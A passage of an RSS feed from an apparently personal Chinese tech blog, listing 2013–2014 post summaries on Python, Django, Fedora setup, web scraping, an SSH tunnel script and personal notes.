    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; HttpResponse(template&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;render(context))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>关于最优价格计算的想法</title>
      <link>/posts/%E5%85%B3%E4%BA%8E%E6%9C%80%E4%BC%98%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E7%9A%84%E6%83%B3%E6%B3%95/</link>
      <pubDate>Fri, 21 Mar 2014 15:53:11 +0000</pubDate>
      
      <guid>/posts/%E5%85%B3%E4%BA%8E%E6%9C%80%E4%BC%98%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E7%9A%84%E6%83%B3%E6%B3%95/</guid>
      <description>&lt;p&gt;假设现在某型号有2个供货商提供,最简化模型如下：&lt;/p&gt;
&lt;p&gt;A: (P X),(Q Y)&lt;/p&gt;
&lt;p&gt;B: (P M),(Q N)&lt;/p&gt;
&lt;p&gt;根据实际情况,买的多价格越低，故&lt;code&gt;X&amp;gt;Y,M&amp;gt;N&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果&lt;code&gt;M&amp;gt;X&lt;/code&gt;,&lt;code&gt;N&amp;gt;Y&lt;/code&gt;,明显的不论数量多少都应该去A买，反之亦然。&lt;/p&gt;
&lt;p&gt;以&lt;code&gt;M&amp;gt;X&lt;/code&gt;,&lt;code&gt;N&amp;lt;Y&lt;/code&gt;为例,则可推断出&lt;code&gt;M&amp;gt;X&amp;gt;Y&amp;gt;N&lt;/code&gt;。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>KaliLinux安装失败的解决方法</title>
      <link>/posts/kalilinux%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</link>
      <pubDate>Tue, 18 Mar 2014 12:38:47 +0000</pubDate>
      
      <guid>/posts/kalilinux%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</guid>
      <description>不知道什么原因，安装kalilinux的时候总是安装失败，失败步骤：安装操作系统。偶尔这步通过了，又出现了grub无法安装的情况。
下载了各个版本都是这样之后，对比了一下sha的值，发现和官网上给出的并不一样&amp;hellip;.什么情况？！然后根据http://cdimage.kali.org/kali-latest/amd64/这发现，正确的值应该是
d859cc2798a24c48ddd37c6aafd88c5dc5e6e123 kali-linux-1.0.6-amd64-mini.iso281ddb3d14619a973e254b8f484b7fe27defa822 kali-linux-1.0.6-amd64.iso3cf383be7778d1676c015cb5430422e672ec59fa kali-linux-1.0.6-amd64-mini.torrentcfa0ad0dce1d4a170adf1cd342c622db23e785ef kali-linux-1.0.6-amd64.torrent又下载了sha值一样的镜像后，还是无法安装操作系统。</description>
    </item>
    
    <item>
      <title>虚拟环境下安装mysql-python</title>
      <link>/posts/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AE%89%E8%A3%85mysql-python/</link>
      <pubDate>Wed, 12 Mar 2014 17:54:50 +0000</pubDate>
      
      <guid>/posts/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AE%89%E8%A3%85mysql-python/</guid>
      <description>使用virtualenv虚拟环境的时候，mysql-python安装时报错：
_mysql.c:44:23: fatal error: my_config.h: No such file or directory#include &amp;quot;my_config.</description>
    </item>
    
    <item>
      <title>pip下载经常超时的解决办法</title>
      <link>/posts/pip%E4%B8%8B%E8%BD%BD%E7%BB%8F%E5%B8%B8%E8%B6%85%E6%97%B6%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</link>
      <pubDate>Wed, 12 Mar 2014 17:51:08 +0000</pubDate>
      
      <guid>/posts/pip%E4%B8%8B%E8%BD%BD%E7%BB%8F%E5%B8%B8%E8%B6%85%E6%97%B6%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</guid>
      <description>最近使用pip安装python模块的时候经常遇到超时而导致失败，解决办法有2个：
 使用-i参数指定url，例如：pip install flask -i http://pypi.v2ex.com/simple 修改pip的配置文件：  [global] timeout = 6000index-url = http://pypi.</description>
    </item>
    
    <item>
      <title>飞鸟与鱼</title>
      <link>/posts/%E9%A3%9E%E9%B8%9F%E4%B8%8E%E9%B1%BC/</link>
      <pubDate>Sat, 08 Mar 2014 15:50:07 +0000</pubDate>
      
      <guid>/posts/%E9%A3%9E%E9%B8%9F%E4%B8%8E%E9%B1%BC/</guid>
      <description>世界上最遥远的距离 The furthest distance way in the world
不是生与死的距离 is not the way from birth to the end.</description>
    </item>
    
    <item>
      <title>python的sh库使用案例</title>
      <link>/posts/python%E7%9A%84sh%E5%BA%93%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B/</link>
      <pubDate>Mon, 17 Feb 2014 09:23:09 +0000</pubDate>
      
      <guid>/posts/python%E7%9A%84sh%E5%BA%93%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B/</guid>
      <description>sh 可让你调用任意程序，就好象是一个函数一般 http://amoffat.github.io/sh/
这里我用unzip以及mv为例：
#coding=utf-8 &amp;#39;&amp;#39;&amp;#39;@CreateDate： Fri Feb 14 15:48:13 CST 2014@FileName：unzip.</description>
    </item>
    
    <item>
      <title>django数据库分库</title>
      <link>/posts/django%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E5%BA%93/</link>
      <pubDate>Tue, 11 Feb 2014 09:34:25 +0000</pubDate>
      
      <guid>/posts/django%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E5%BA%93/</guid>
      <description>有些时候我们需要项目中的app访问不同的数据库，这时就要进行分库操作。
首先建立一个db_router.py，内容示例：
#coding=utf-8 DATABASES = {&amp;#39;default&amp;#39;: {&amp;#39;ENGINE&amp;#39;: &amp;#39;django.</description>
    </item>
    
    <item>
      <title>fedora19升级20</title>
      <link>/posts/fedora19%E5%8D%87%E7%BA%A720/</link>
      <pubDate>Mon, 27 Jan 2014 13:14:09 +0000</pubDate>
      
      <guid>/posts/fedora19%E5%8D%87%E7%BA%A720/</guid>
      <description>不做死就不会死哈哈。
首先yum安装fedup，然后先用update命令把已经安装的包升级，然后就是sudo fedup --network 20
如果出现了 GPG KEY错误，我的做法是把三方源全都删掉，升级后再添加回来。
不过升级了20后貌似也没什么吸引我的地方，而且中文汉化的不是非常好，干脆直接调整成英文版了。（有强迫症的伤不起啊～）
如果你是重新安装的20，我之前19的美化记录以及软件安装方法都可以用。</description>
    </item>
    
    <item>
      <title>fedora19中VIM复制粘贴到系统剪切板</title>
      <link>/posts/fedora19%E4%B8%ADvim%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E5%88%B0%E7%B3%BB%E7%BB%9F%E5%89%AA%E5%88%87%E6%9D%BF/</link>
      <pubDate>Fri, 10 Jan 2014 14:42:30 +0000</pubDate>
      
      <guid>/posts/fedora19%E4%B8%ADvim%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E5%88%B0%E7%B3%BB%E7%BB%9F%E5%89%AA%E5%88%87%E6%9D%BF/</guid>
      <description>如果用的是fedoar，你会发现yum没有vim-gnomevim-gtk这类东西，而且使用:reg也没有+和*这两个寄存器。gvim又感觉太难看，难道fedora中vim复制到系统剪切板是个坑？？
不过，咱们却有一个神器——vimx!这个就包含了+和*这两个寄存器了！(如果你没有这个vimx就安个gvim)
使用VIMX打开编辑文件，想复制的时候，先按V进入可视模式，然后选中要复制的东西后 依次按“+y这三个按键就复制到剪贴版了。
至于vim中寄存器介绍或者其他复制粘贴方式可以自行google，这里就不介绍了。</description>
    </item>
    
    <item>
      <title>2014，你好！</title>
      <link>/posts/2014%E4%BD%A0%E5%A5%BD/</link>
      <pubDate>Wed, 01 Jan 2014 21:04:45 +0000</pubDate>
      
      <guid>/posts/2014%E4%BD%A0%E5%A5%BD/</guid>
      <description>&lt;p&gt;虽说我的记忆还停留在高中，不过事实始终提醒着我：”你丫的别闹了！“哈哈！2014年，要真正的脱离学校步入社会了，几个月之后要告别学生这个身份，真是不舍得阿！再也没有那么长的寒暑假了！&lt;/p&gt;
&lt;p&gt;2013年还是很有收获的一年，找到了实习，认识了很多新的伙伴。不过，这么多月我的工资怎么一分都没剩下呢！！？？唉，记账这个事始终没坚持下来阿！年末送给自己一部手机当作年终奖，犒劳一下自己吧！&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>fedora19更换fcitx输入法</title>
      <link>/posts/fedora19%E6%9B%B4%E6%8D%A2fcitx%E8%BE%93%E5%85%A5%E6%B3%95/</link>
      <pubDate>Fri, 06 Dec 2013 12:00:47 +0000</pubDate>
      
      <guid>/posts/fedora19%E6%9B%B4%E6%8D%A2fcitx%E8%BE%93%E5%85%A5%E6%B3%95/</guid>
      <description>今天上午实在是忍受不了ibus的折磨更换输入法，首先删除ibus
sudo yum remove ibusgsettings set org.gnome.settings-daemon.plugins.keyboard active false之后安装fcitx:sudo yum install fcitx*</description>
    </item>
    
    <item>
      <title>linux用vps翻墙(ssh篇)</title>
      <link>/posts/linux%E7%94%A8vps%E7%BF%BB%E5%A2%99-ssh%E7%AF%87/</link>
      <pubDate>Fri, 06 Dec 2013 10:17:28 +0000</pubDate>
      
      <guid>/posts/linux%E7%94%A8vps%E7%BF%BB%E5%A2%99-ssh%E7%AF%87/</guid>
      <description>最近买了一个VPS玩，提供了SSH功能，那就用它来翻翻墙吧。
编写一个脚本文件，内容如下
#!/usr/bin/expect -fset port 7070set user xxxxset host IP地址set password xxxxset timeout -1 spawn ssh -fND $port $user@$host expect &amp;#34;*assword:*&amp;#34; send &amp;#34;$passwordr&amp;#34; expect eof如果提示spawn命令不存在一类的错误则安装expect、spawn</description>
    </item>
    
    <item>
      <title>fedora19安装codeblocks</title>
      <link>/posts/fedora19%E5%AE%89%E8%A3%85codeblocks/</link>
      <pubDate>Wed, 04 Dec 2013 22:14:10 +0000</pubDate>
      
      <guid>/posts/fedora19%E5%AE%89%E8%A3%85codeblocks/</guid>
      <description>嫌麻烦的可以用yum install codeblocks安装，不过版本是10.05
爱尝鲜的可以去官网下最新版本12.11，功能多了很多。目前没有fedora19的不过18的也可以用。
下载codeblocks-12.11-1.el18.x86_64.tar.bz2后解压得到4个文件，全部安装即可。其实只安装codeblocks-12.11-1.el18.x86_64.rpm就可以使用了，全都安装后功能更多一些。
如果是用yum安装的，运行程序时终端十分丑陋，可以设置
Settings-&amp;gt;Environment-&amp;gt;&amp;quot;Terminal to launch console programs&amp;quot; 为 &amp;quot;gnome-terminal --geometry 80x20+100+100 --hide-menubar -t $TITLE -x&amp;quot;（不包含引号）。参数可以自己修改。</description>
    </item>
    
    <item>
      <title>django文件上传功能</title>
      <link>/posts/django%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD/</link>
      <pubDate>Wed, 04 Dec 2013 17:13:50 +0000</pubDate>
      
      <guid>/posts/django%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD/</guid>
      <description>今天需要一个文件上传功能，所以代码如下
def ci_test(request):try:if request.POST.has_key(&amp;#34;send&amp;#34;):xml_string=&amp;#34;&amp;#34;final_xml = &amp;#34;&amp;#34;file_obj = request.</description>
    </item>
    
    <item>
      <title>python分离中、英文</title>
      <link>/posts/python%E5%88%86%E7%A6%BB%E4%B8%AD%E8%8B%B1%E6%96%87/</link>
      <pubDate>Wed, 04 Dec 2013 08:42:39 +0000</pubDate>
      
      <guid>/posts/python%E5%88%86%E7%A6%BB%E4%B8%AD%E8%8B%B1%E6%96%87/</guid>
      <description>本来打算使用正则表达式，但是发现实际情况不能简单的用正则表达式处理，于是参考 http://blog.sina.com.cn/s/blog_933dc4350100x6mu.html 代码如下：
# coding=utf-8 &amp;#39;&amp;#39;&amp;#39;@CreateDate： 2013年 12月 03日 星期二 11:11:39 CST@FileName：extract.</description>
    </item>
    
    <item>
      <title>fedora19装XMind</title>
      <link>/posts/fedora19%E5%AE%89%E8%A3%85xmind/</link>
      <pubDate>Tue, 03 Dec 2013 11:40:20 +0000</pubDate>
      
      <guid>/posts/fedora19%E5%AE%89%E8%A3%85xmind/</guid>
      <description>本来用bubbl这个在线的思维导图还凑合，不过他这个未付费用户只能存储3张，只好换回本地应用。
安装freemind很简单，直接yum即可，不过界面和功能上有待加强。
换成xmind这个强大的跨平台软件，发现只有deb包，那么想在fedora中使用进行下面操作即可：
首先，下载对应版本的deb包，32bit系统下载32bit软件包，64bit系统下载64bit软件包
ar -x xmind-xxxxx.deb解包，得到data.tar.gz 和control.tar.gz 两个归档文件
解压data.tar.gz tar xf data.</description>
    </item>
    
    <item>
      <title>python线程小学习</title>
      <link>/posts/python%E7%BA%BF%E7%A8%8B%E5%B0%8F%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Mon, 02 Dec 2013 18:07:11 +0000</pubDate>
      
      <guid>/posts/python%E7%BA%BF%E7%A8%8B%E5%B0%8F%E5%AD%A6%E4%B9%A0/</guid>
      <description>以前我写多线程程序时候，经常把一个线程类单独封装，然后使用全局锁来控制竞争资源的处理。今天看了这样一段代码
class Fetcher:def __init__(self,threads):self.opener = urllib2.build_opener(urllib2.HTTPHandler)self.lock = Lock() #线程锁 self.</description>
    </item>
    
    <item>
      <title>Python 深入理解yield</title>
      <link>/posts/python-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3yield/</link>
      <pubDate>Sun, 01 Dec 2013 23:38:27 +0000</pubDate>
      
      <guid>/posts/python-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3yield/</guid>
      <description>不知道原文出处，向原作者表示感谢。
yield的英文单词意思是生产，刚接触Python的时候感到非常困惑，一直没弄明白yield的用法。只是粗略的知道yield可以用来为一个函数返回值塞数据，比如下面的例子：
def addlist(alist):for i in alist:yield i + 1取出alist的每一项，然后把i + 1塞进去。然后通过调用取出每一项：</description>
    </item>
    
    <item>
      <title>Python关键字yield详解</title>
      <link>/posts/python%E5%85%B3%E9%94%AE%E5%AD%97yield%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Sun, 01 Dec 2013 23:04:54 +0000</pubDate>
      
      <guid>/posts/python%E5%85%B3%E9%94%AE%E5%AD%97yield%E8%AF%A6%E8%A7%A3/</guid>
      <description>伯乐在线 –刘志军编译自stackoverflow Python标签中投票率最高的一个问题《The Python yield keyword explained》，e-satis 详细回答了关于yield 以及 generator、iterable、iterator、iteration之间的关系。</description>
    </item>
    
    <item>
      <title>django中静态文件的使用</title>
      <link>/posts/django%E4%B8%AD%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Tue, 19 Nov 2013 18:04:21 +0000</pubDate>
      
      <guid>/posts/django%E4%B8%AD%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>记得我刚刚开始接触django的时候，对于静态文件的引用始终一头雾水，按照网上说明的添加代码就是不好使。 今天再回头看看，突然发现以前自己还真是笨阿！补一篇记录算是弥补以前的缺憾了～ django版本1.5.3 目录结构：
projectname----projectname--------templates------------base.html------------appname----------------a.html--------media------------mp3------------flv--------static------------img----------------s.</description>
    </item>
    
    <item>
      <title>fedora19安装cairo-dock</title>
      <link>/posts/fedora19%E5%AE%89%E8%A3%85cairo-dock/</link>
      <pubDate>Sun, 17 Nov 2013 21:52:48 +0000</pubDate>
      
      <guid>/posts/fedora19%E5%AE%89%E8%A3%85cairo-dock/</guid>
      <description>最近又把电脑折腾残废了，没办法，只好重安装系统。本来想告别fedora回到opensuse的怀抱，不过却发现opensuse下用zypper安装的软件版本都比较低，为了能和我已经编好的程序保持一致性，只好又换回fedora19。
安装过程还算顺利，添加国内源、三方源后更新系统却发现
错误：软件包：perl-PathTools-3.2701-1.el5.rf.x86_64 (rpmforge)需要：perl(VMS::Filespec)您可以尝试用 --skip-broken 来解决该问题您可以尝试运行： rpm -Va --nofiles --nodigest即便安装了perl、使用了提示的命令也是不好使。折腾了很久都不知道结果，只好卸载了rpmforge源后问题解决。不过发现卸载了这个源后很多软件都yum找不到了&amp;hellip;&amp;hellip;直到刚才我才发现我居然用的是el5的架构&amp;hellip;&amp;hellip;眼残了阿&amp;hellip;&amp;hellip;而用yum erase rpmforge-release 这个命令居然把我的rpmfusion源也给删除了。不知道什么原理&amp;hellip;&amp;hellip;重新安rpmfusion源，却死活提示以经安装。</description>
    </item>
    
    <item>
      <title>fedora19安装skype</title>
      <link>/posts/fedora19%E5%AE%89%E8%A3%85skype/</link>
      <pubDate>Sat, 16 Nov 2013 19:09:40 +0000</pubDate>
      
      <guid>/posts/fedora19%E5%AE%89%E8%A3%85skype/</guid>
      <description>sudo yum -y install libXv.i686 libXScrnSaver.i686 qt.i686 qt-x11.i686 pulseaudio-libs.i686 pulseaudio-libs-glib2.i686 alsa-plugins-pulseaudio.</description>
    </item>
    
    <item>
      <title>伪造header突破ip限制抓取网站内容</title>
      <link>/posts/%E4%BC%AA%E9%80%A0header%E7%AA%81%E7%A0%B4ip%E9%99%90%E5%88%B6%E6%8A%93%E5%8F%96%E7%BD%91%E7%AB%99%E5%86%85%E5%AE%B9/</link>
      <pubDate>Fri, 15 Nov 2013 15:28:15 +0000</pubDate>
      
      <guid>/posts/%E4%BC%AA%E9%80%A0header%E7%AA%81%E7%A0%B4ip%E9%99%90%E5%88%B6%E6%8A%93%E5%8F%96%E7%BD%91%E7%AB%99%E5%86%85%E5%AE%B9/</guid>
      <description>有些网站为了防止爬虫抓取而设定了某些条件，比如如果一个ip某时间段内访问量很大，则禁止这个ip访问。如果这个网站启用了cdn加速服务的话，可以修改header中的host，并在url中直接用ip进行网站的访问。
#coding=utf-8 import urllib2import randomimport os,sysDIRNAME = os.</description>
    </item>
    
    <item>
      <title>python 获取网站cookie</title>
      <link>/posts/python-%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99cookie/</link>
      <pubDate>Fri, 15 Nov 2013 15:20:14 +0000</pubDate>
      
      <guid>/posts/python-%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99cookie/</guid>
      <description>对于一般的网站来说，通过以下代码便可以获取到cookie：
import urllib2import urllibimport cookieliblogurl = &amp;#34;https://www.digikey.com/classic/RegisteredUser/Login.aspx?&amp;#34;cj = cookielib.</description>
    </item>
    
    <item>
      <title>如何为Gnome3添加自启动程序</title>
      <link>/posts/%E5%A6%82%E4%BD%95%E4%B8%BAgnome3%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/</link>
      <pubDate>Thu, 14 Nov 2013 10:56:13 +0000</pubDate>
      
      <guid>/posts/%E5%A6%82%E4%BD%95%E4%B8%BAgnome3%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/</guid>
      <description>方法一 直接编辑配置文件 以开机自动启动pidgin为例：
这里有一种方法可以使你自己的任意程序，随着Gnome3桌面的登陆自动启动。
创建一个独立的文件在~/.config/autostart目录下，如果此目录不存在，则你应该自己创建它。（~代表当前用户的home目录）
为这个文件起个名字叫做：appname.desktop; appname 是指你想伴随Gnome3启动的程序的名字。
例如：我想 pidgin (一个免费的通讯工具）当Gnome3启动时自动启动，在我的Fedora系统中，所以我给这个文件命名：pidgin.</description>
    </item>
    
    <item>
      <title>python traceback模块</title>
      <link>/posts/python-traceback%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Thu, 14 Nov 2013 09:52:51 +0000</pubDate>
      
      <guid>/posts/python-traceback%E6%A8%A1%E5%9D%97/</guid>
      <description>如果我们再程序中写出一个会引发异常的代码，比如1/0，就会引发一个异常，程序中止。
输出：
Traceback (most recent call last):File &amp;quot;trackbacks.py&amp;quot;, line 1, in &amp;lt;module&amp;gt;1/0ZeroDivisionError: integer division or modulo by zeroShell 已返回1为了程序的健壮性，我们常常加入异常处理。</description>
    </item>
    
    <item>
      <title>python lxml模块</title>
      <link>/posts/python-lxml%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 13 Nov 2013 18:11:17 +0000</pubDate>
      
      <guid>/posts/python-lxml%E6%A8%A1%E5%9D%97/</guid>
      <description>继续分析那个爬虫程序，今天从中学习了lxml模块的基本使用。这个模块用来解析XML、HTML内容，据说速度上秒杀了&amp;quot;美丽的汤&amp;rdquo;。
官网： http://lxml.de/api/index.html
#coding=utf-8 &amp;#39;&amp;#39;&amp;#39;Created on 2013年11月13日学习使用lxml@author: dear_shen&amp;#39;&amp;#39;&amp;#39;from lxml import etreeif __name__ == &amp;#39;__main__&amp;#39;:broken_str = &amp;#39;&amp;#39;&amp;#39;&amp;lt;!</description>
    </item>
    
    <item>
      <title>生产者消费者问题python版</title>
      <link>/posts/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98python%E7%89%88/</link>
      <pubDate>Wed, 13 Nov 2013 15:17:54 +0000</pubDate>
      
      <guid>/posts/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98python%E7%89%88/</guid>
      <description>记得学操作系统这门课的时候就打算自己写一个，居然一眨眼过了一年才写，真是对不起老师阿！
#coding=utf-8 &amp;#39;&amp;#39;&amp;#39;Created on 2013年11月13日生产者与消费者python版@author: dear_shen&amp;#39;&amp;#39;&amp;#39;import threadingimport Queueimport timecondition = threading.</description>
    </item>
    
    <item>
      <title>Python：使用threading模块实现多线程编程</title>
      <link>/posts/python%E4%BD%BF%E7%94%A8threading%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/</link>
      <pubDate>Wed, 13 Nov 2013 11:44:22 +0000</pubDate>
      
      <guid>/posts/python%E4%BD%BF%E7%94%A8threading%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/</guid>
      <description>原文链接找不到了，故整理格式后记录于此。
常用函数 &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39; Created on 2012-9-7 @author: walfred@module: thread.ThreadTest3 @description:&amp;#39;&amp;#39;&amp;#39; import threading class MyThread(threading.</description>
    </item>
    
    <item>
      <title>python threading模块</title>
      <link>/posts/python-threading%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 13 Nov 2013 11:16:09 +0000</pubDate>
      
      <guid>/posts/python-threading%E6%A8%A1%E5%9D%97/</guid>
      <description>threading模块  Thread 线程类，这是我们用的最多的一个类，你可以指定线程函数执行或者继承自它都可以实现子线程功能； Timer与Thread类似，但要等待一段时间后才开始运行； Lock 锁原语，这个我们可以对全局变量互斥时使用； RLock 可重入锁，使单线程可以再次获得已经获得的锁； Condition 条件变量，能让一个线程停下来，等待其他线程满足某个“条件”； Event 通用的条件变量。多个线程可以等待某个事件发生，在事件发生后，所有的线程都被激活； Semaphore为等待锁的线程提供一个类似“等候室”的结构； BoundedSemaphore 与semaphore类似，但不允许超过初始值；  Thread类  是你主要的线程类，可以创建进程实例。该类提供的函数包括： getName(self) 返回线程的名字 isAlive(self) 布尔标志，表示这个线程是否还在运行中 isDaemon(self) 返回线程的daemon标志 join(self, timeout=None) 程序挂起，直到线程结束，如果给出timeout，则最多阻塞timeout秒 run(self) 定义线程的功能函数 setDaemon(self, daemonic) 把线程的daemon标志设为daemonic setName(self, name) 设置线程的名字 start(self) 开始线程执行  关于join()和setDaemon join：如在一个线程B中调用threada.</description>
    </item>
    
    <item>
      <title>python queue模块</title>
      <link>/posts/python-queue%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 13 Nov 2013 11:11:38 +0000</pubDate>
      
      <guid>/posts/python-queue%E6%A8%A1%E5%9D%97/</guid>
      <description>创建一个“队列”对象 import Queuemyqueue = Queue.Queue(maxsize = 10)Queue.Queue类即是一个队列的同步实现。队列长度可为无限或者有限。可通过Queue的构造函数的可选参数maxsize来设定队列长度。如果maxsize小于1就表示队列长度无限。
将一个值放入队列中 myqueue.</description>
    </item>
    
    <item>
      <title>django-I18n-国际化语言</title>
      <link>/posts/django-i18n-%E5%9B%BD%E9%99%85%E5%8C%96%E8%AF%AD%E8%A8%80/</link>
      <pubDate>Tue, 12 Nov 2013 14:58:47 +0000</pubDate>
      
      <guid>/posts/django-i18n-%E5%9B%BD%E9%99%85%E5%8C%96%E8%AF%AD%E8%A8%80/</guid>
      <description>上一篇文章提到了django 的语言问题，查阅资料后发现刚才的解释不是十分准确，看到一篇介绍相关内容的博客感觉不错，节选部分全文
先来看两个概念：
 国际化：是指为了该软件在任何地区的潜在使用而进行程序设计的过程。 它包括了为将来翻译而标记的文本（比如用户界面要素和错误信息等）、日期和时间的抽象显示以便保证不同地区的标准得到遵循、为不同时区提供支持，并且一般 确保代码中不会存在关于使用者所在地区的假设。 您会经常看到国际化被缩写为“I18N” (18表示Internationlization这个单词首字母I和结尾字母N之间的字母有18个)。 本地化： 是指使一个国际化的程序为了在某个特定地区使用而进行实际翻译的过程。 有时，本地化缩写为L10N 。  使用Django 国际化  第一步：在你的Python代码和模板中嵌入待翻译的字符串。 第二步：把那些字符串翻译成你要支持的语言。 第三步：在你的Django settings文件中激活本地中间件。  如何嵌入待翻译的字符串 使用函数django.</description>
    </item>
    
    <item>
      <title>关于lambda s:s</title>
      <link>/posts/%E5%85%B3%E4%BA%8Elambda-s-s/</link>
      <pubDate>Tue, 12 Nov 2013 14:31:02 +0000</pubDate>
      
      <guid>/posts/%E5%85%B3%E4%BA%8Elambda-s-s/</guid>
      <description>在某前辈的代码中发现这么一句：
_=lambda s:s当时不太理解这么写的目的，google之后明白了（顺便吐槽百度，搜“lambda s:s”出来的结果没几个有用的），记录如下：
一般情况下出现这种写法应该是用在&amp;quot;and_or&amp;quot;技巧中，也可以叫做“逻辑短路”。相信学过C语言的一定很熟悉“and一假为假、or一真为真”这句话。
python中lambda的bool值永远为真（这里指lambda本身而不是它的返回值），《dive into python》原文翻译：
 lambda函数在布尔环境中总是为真。(这并不意味这lambda函数不能返回假值。这个函数对象的布尔值为真；它的返回值可以是任何东西。)</description>
    </item>
    
    <item>
      <title>python动态添加类属性、实例属性</title>
      <link>/posts/python%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E7%B1%BB%E5%B1%9E%E6%80%A7%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Tue, 12 Nov 2013 11:58:07 +0000</pubDate>
      
      <guid>/posts/python%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0%E7%B1%BB%E5%B1%9E%E6%80%A7%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7/</guid>
      <description>看高手写出来的东西果然能学到很多阿！！昨天学到了如何用OptionParser生成命令行帮助信息，本来今天是要从中学习doctest使用的，不过却发现了这样一段代码：
&amp;gt;&amp;gt;&amp;gt; import datetime&amp;gt;&amp;gt;&amp;gt; logger = configLogger(&amp;#39;test.log&amp;#39;)&amp;gt;&amp;gt;&amp;gt; time = datetime.</description>
    </item>
    
    <item>
      <title>Python optionParser模块</title>
      <link>/posts/python-optionparser%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Mon, 11 Nov 2013 18:08:48 +0000</pubDate>
      
      <guid>/posts/python-optionparser%E6%A8%A1%E5%9D%97/</guid>
      <description>用于生成模块说明。
#coding=utf-8 from optparse import OptionParserdef opt():parser = OptionParser(description=&amp;#34;整个文件功能一类的帮助信息&amp;#34;)parser.</description>
    </item>
    
    <item>
      <title>阳朔归来（11.10）</title>
      <link>/posts/%E9%98%B3%E6%9C%94%E5%BD%92%E6%9D%A511-10/</link>
      <pubDate>Fri, 08 Nov 2013 13:44:09 +0000</pubDate>
      
      <guid>/posts/%E9%98%B3%E6%9C%94%E5%BD%92%E6%9D%A511-10/</guid>
      <description>&lt;p&gt;就要出发去桂林了，无心继续看代码哈！发现8月入职日子不错，入职不久就赶上了中秋节，参加了公司中秋聚餐+月饼一盒。之后就是十一，得购物卡一张。再后来就是公司的旅游，接下来还有元旦、新年&amp;hellip;&amp;hellip;
接触python已经有3个多月了，越学越发现自己的不足，发现还有那么多的东西不会。看了那些大牛的博客后着实受了很大刺激，看看我自己的博客，很多都是充当“大自然的搬运工”这个角色，无论从质量还是数量来讲都不是很好。不过随后也就释然了，如果我学了三个月就达到他们那样的高度，那么所谓的“大牛”又能有什么含金量了呢？几年之后，我也要像他们那样，写出优秀的技术文章，向开源社区贡献自己的力量！&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python多线程爬虫</title>
      <link>/posts/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E8%99%AB/</link>
      <pubDate>Fri, 08 Nov 2013 11:52:43 +0000</pubDate>
      
      <guid>/posts/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E8%99%AB/</guid>
      <description>&lt;p&gt;原文链接：http://www.dongwm.com/archives/pa-chong-lian-xi/&lt;/p&gt;
&lt;p&gt;正好最近学习多线程、爬虫相关的东西，这篇文章写的十分不错！&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>为什么买的数量越多，得到的折扣反而低了？</title>
